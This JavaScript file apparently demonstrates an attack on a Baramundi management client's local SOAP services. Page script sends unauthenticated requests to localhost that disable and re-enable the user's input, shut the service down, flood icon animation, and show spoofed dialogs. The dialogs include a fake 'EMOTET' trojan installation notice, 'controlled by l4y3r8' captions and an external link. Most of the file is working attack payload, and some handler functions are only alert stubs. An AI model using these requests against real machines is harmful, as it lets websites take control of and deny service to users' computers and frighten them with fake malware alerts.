var notifierurl="http://localhost:11001/traynotifierservice";
var managementagenturl="http://localhost:11000/clientagent";

var AnimateIconDoS='<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:AnimateIcon> \
<nDelay> 60 </nDelay> + \
</traynotifierservice:AnimateIcon> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

var ShowNotification='<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:ShowNotification> \
<CallbackEndpoint>http://localhost:11000/clientagent</CallbackEndpoint> \
<IconHandle>1</IconHandle><NotifyMessage>EMOTET Troj.32 wird installiert....</NotifyMessage> \
<b64Data>Tm90ZXBhZCsr</b64Data><nNotifyIcon>1</nNotifyIcon></traynotifierservice:ShowNotification>\
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>';

var ShowLogfileWindow='<?xml version="1.0" encoding="UTF-8"?> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:ShowLogfileWindow> \
<Caption>controlled by l4y3r8 :-) ...</Caption> \
<Filename>S:\\Austausch\\Haentzschel\\skull.txt</Filename>\
<ulOffset>123</ulOffset>\
</traynotifierservice:ShowLogfileWindow>\
</SOAP-ENV:Body>\
</SOAP-ENV:Envelope>';

var TicketTextHtmlEscaped='&lt;html&gt;&lt;body bgcolor=&quot;#FF00FF&quot;&gt;&lt;h1&gt;HACK MACK...HACK MACK....&lt;br&gt;&lt;a href=&quot;http://inn.spb.ru/images/100/DSC100128698.jpg&quot;&gt;Baramundi Kiosk&lt;/a&gt; &lt;/body&gt;&lt;/html&gt;'

var ShowAboutDialog='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body><traynotifierservice:ShowAboutDialog> \
<Caption> controlled by l4y3r8 :-) ... </Caption> \
<TickerText>';
ShowAboutDialog+=TicketTextHtmlEscaped;
ShowAboutDialog+='</TickerText> \
<Hyperlink>http://inn.spb.ru/images/100/DSC100128698.jpg</Hyperlink> \
<VersionInfos> \
<m-Module> m-Module </m-Module> \
<m-Version> m-Version </m-Version> \
<m-Path> m-Path </m-Path> \
</VersionInfos> \
</traynotifierservice:ShowAboutDialog> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>';

var ShowActionTimeoutDialog='<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:ShowActionTimeoutDialog> \
<nTimeout>10</nTimeout> \
<Caption>controlled by l4y3r8 :-) ...</Caption>\
</traynotifierservice:ShowActionTimeoutDialog>\
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>';

var EnableInput='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:EnableInput> \
</traynotifierservice:EnableInput> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>';

var DisableInput='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:DisableInput> \
</traynotifierservice:DisableInput> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

var ShutdownService='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:ShutdownService> \
</traynotifierservice:ShutdownService> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

// from stack overflow
function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}

function input(){
	alert('Input will be disabled for 5 seconds...');
	localpostrequest(notifierurl,DisableInput);
	sleep(5000);
	localpostrequest(notifierurl,EnableInput);
};

function localpostrequest(url,soapmsg){
	$.ajax({
		type:"POST",
		url: url,
		data:soapmsg,
		success: null,
		dataType: "xml"
	});
};

function notify(){
	alert("notify");
};

function logfile(){
	alert("logfile");
};
function about(){
	alert("about");
};
function disableinput(){
	alert("disableinput");
};
function timeoutdialog(){
	alert("timeoutdialog");
};
function guiaction(){
	alert("ShowNotification");
};
